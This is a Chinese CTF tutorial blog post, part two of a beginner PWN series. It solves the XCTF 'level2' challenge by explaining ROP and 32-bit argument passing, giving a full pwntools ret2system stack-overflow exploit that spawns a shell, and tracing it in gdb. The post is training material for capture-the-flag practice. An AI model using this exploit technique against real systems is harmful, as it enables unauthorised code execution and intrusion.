# Mac 环境下 PWN入门系列（二）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x0 前言
菜鸡入门,刷题可能是比较快的方式,通过刷攻防世界的新手题能快速了解到pwn的各种类型的题目,然后再仔细分析各种类型的考点。
## 0x1 阅读前注意点
由于我是多次调试的，所以内存地址总会发生变化，所以读者没必要太关注内存地址，由于内存地址偏移量是不变的，我们只关注内存差值就行了。
## 0x2 实践刷题篇
这次我们接着上一篇的,直接把攻防世界新手区的题目刷完吧。
###  0x2.1 level2
####  (1)题目描述及其考点
菜鸡请教大神如何获得flag，大神告诉他‘使用面向返回的编程(ROP)就可以了’
考点: ROP
ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件
  * 程序存在溢出，并且可以控制返回地址。
  * 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。
####  (2)wp
首先日常看保护:
  * 
可以看到是32位程序, 开启了NX保护,意味着栈没办法执行代码。
我们打开ida进行分析下
果断跟进那个显然漏洞函数:
我们可以很明显看 buf 的栈大小是: 0x88
这里要注意下
我们是通过填充buf去溢出数据,因为buf和vulnerablefunction函数是在同一个栈的，所以我们这里只能覆盖vulnerablefunction函数新开的栈的内容
一开始我傻傻地以为直接覆盖read函数的返回地址呢,read函数读取数据是从buffer里面读取的，根本不会有溢出的可能性，况且与buf数组也不在同一个栈空间。
而read可以读取0x100这样就存在栈溢出覆盖vulnerable_function函数返回地址为system函数,但是需要注意的是。
这里我们也要控制传入/bin/sh作为system的参数,这里我们可以利用程序内部的/bin/sh字符串地址。
至于为什么会这样,其实这个涉及到参数存放的函数约定的问题:
32位程序的参数是压入栈
64位程序前4个参数分别是rcx rdx r8 r9
所以对于32位程序,我们可以在栈上布置system的参数/bin/sh
但是64位的程序,就要进行找那种rop来构造了,后面我会细解这个相关的题目。
[x86 x64下调用约定浅析](https://blog.csdn.net/huangyimo/article/details/80573661)
[x64汇编第三讲,64位调用约定与函数传参.](https://www.cnblogs.com/iBinary/p/10959444.html)
为了更好理解这个过程:
我们可以写个rop.c 程序
    #include 
    int test(char cmd[]){
    return system(cmd);
    }
    int main(){
    char cmd[] = "/bin/sh";
    test(cmd);
    return 0;
    }
然后编译:
这里我们指定生成32位程序
    gcc -m32 -g -Wall rop.c -o rop
然后开启gdb进行调试下:
    b main
disassemble /m main 查看下汇编指令
    # 这是一个简单的转换脚本,因为是小端序,所以[::-1]
    # '0x68732f6e69622f'
    # 所以说/bin/sh存放的时候,用了4字节对齐
    #  68732f /sh ebp-0x10先压栈
    # 6e69622f /bin ebp-0x14 低地址后压栈
    #!/usr/bin/python
    string =  '0x68732f6e69622f'
    resString = ""
    for i in range(1, len(string)//2):
    resString += chr(int(string[2*i:2*i+2], 16))
    print(int(string[2*i:2*i+2], 16))
    print(resString[::-1])
我们跟进下test函数,看他是怎么使用我们的参数的
    disassemble /m test
接着我们按si单步看下进入函数的过程
可以看到我们的参数被存放到了eax寄存器里面
我们继续si跟进
这里可以看到他是通过push dword ptr [ebp+8]来获取到/bin/sh，然后压入新栈作为system的参数
这就可以看出来,参数是被分布在栈上的,并且优先于call之前
更详细参数传递内容可以参考:
这里非常感谢一个师傅提供的文章:
[C语言与反汇编学习](//chumen77.github.io/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E3%80%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F\))
https://blog.csdn.net/magicworldwow/article/details/80582144
[8086汇编语言-如何使用栈传递参数
](https://visualgmq.github.io/2019/08/10/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%A0%88%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/)
重新回到我们这个题目来,我们可以通过覆盖vulnerable_function 函数栈空间修改ret,达到任意调用system执行任意代码。
这里先扔出exp
    #! /usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    # 这个设置debug能看到exp执行的流程
    elf = ELF('./pwn6')
    sys_addr = elf.symbols['system']
    sh_addr = elf.search('/bin/sh').next()
    # 这里利用了pwntools两个小用法,方便我们操作
    # 我们通过ELF加载elf文件,然后自动搜索里面的函数地址和寻找字符串。
    # 这里因为是程序内部存在的，所以我们可以直接找到
    # elf.search('/bin/sh').next() 这个其实和我们上面的那个ida直接搜索字符串得到地址是一样的
    payload = 'A' * 0x88 + 'B'*0x4 + p32(sys_addr) +  p32(0xdeadbeef) + p32(sh_addr)
    # 这里0x88是栈空间大小,然后0x4是覆盖掉ebp,后面是调用system+任意的system返回地址+参数
    # io = remote('111.198.29.45',51157)
    io =  process('./pwn6')
    io.sendlineafter("Input:\n",payload)
    io.interactive()
    io.close()
####  (3)动态调试payload
为了更深入理解这个机制，我们可以通过gdb+pwntools来进行动态调试
我们修改下脚本:
    #! /usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    elf = ELF('./pwn6')
    sys_addr = elf.symbols['system']
    sh_addr = elf.search('/bin/sh').next()
    payload = 'A' * 0x88 + 'B'*0x4 + p32(sys_addr) +     p32(0xdeadbeef) + p32(sh_addr)
    # io = remote('111.198.29.45',45800)
    io =  process('./pwn6')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 这里配置tmux纵向显示,
    gdb.attach(io)
    io.sendlineafter("Input:\n",payload)
    io.interactive()
    io.close()
然后在docker里面(ps.环境看我第一篇入门文章的配置),执行tmux进入新的终端,然后就可以调试了。
这里介绍下tmux的用法:
tmux的前缀是: ctrl + b 代表进入tmux标志
1.
(1)ctrl + b 然后再按冒号: 进入命令行模式,输入
set -g mouse on 回车之后就可以用滚轮来上下拖动了
(2)我们直接修改配置文件,来长期保持
    vim ~/.tmux.conf
    set -g mode-mouse on
2.
ctrl+b 然后按住s 可以切换不同的会话
3.
ctrl+b 然后按w可以查看窗口 按n切换到下一个窗口 按p切换到上一个窗口
我们执行下disassemble查看下当前位置
然后finish执行跳出
进入到里面之后,我们打印下栈结构stack 30 如果过长的话 按下回车会继续显示
我们可以看到当前栈EBP寄存器已经被我们传入的数据覆盖了。
那么具体覆盖的过程是怎么样的呢，我们可以更精细化来debugs
一开始我们先不要finish跳出来,我们看下当前的函数调用栈
可以看到是main->vulnerable_function->read->vulnerable_function->main
我们finish执行玩这个函数,就会ret回到read+39继续执行。
可以看到read一下子把我们的payload填充进去,成功复写了vulnerable_function函数的函数调用栈,变成了system然后system的父函数是deadbeed(这个就是我们随便定义的返回地址)
那么具体的复写机制是怎么样的呢,这个我们就需要跟踪程序的执行过程就可以理解为什么这样布置栈数据了(布置公式:
sys_plt+p32(0xdeadbeef)+p32(binsh_addr)
我们继续finish跳出read函数回到vulnerable_function函数现场。
接着si 3直接跳到ret看下read函数的栈结构 stack
ret指令的作用:
栈顶字单元出栈，其值赋给EIP寄存器。即实现了一个程序的转移，将栈顶字单元保存的[偏移地址](https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao)作为下一条指令的[偏移地址](https://www.baidu.com/s?wd=%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao)。
上一篇文章说过了,ebp是当前进入函数的指令地址，ebp+4就是下一条指令地址
这就是’A’ * 0x88 + ‘B’*0x4 + p32(sys_addr) 这样组合的原因
这里我们可以看到ESP就是就是system函数地址了,那么下一条指令就进去了system函数了
我们继续si 跟进 分析下后半段payload(p32(0xdeadbeef) + p32(sh_addr))的原因:
跟着system进去上千行代码是自闭的
其实这个原理就是默认程序调用就是ebp+4 是返回地址,
返回地址+4就是参数值,这个就回到了上面的知识点了,关于参数传递的问题。
push 参数  
push 返回地址  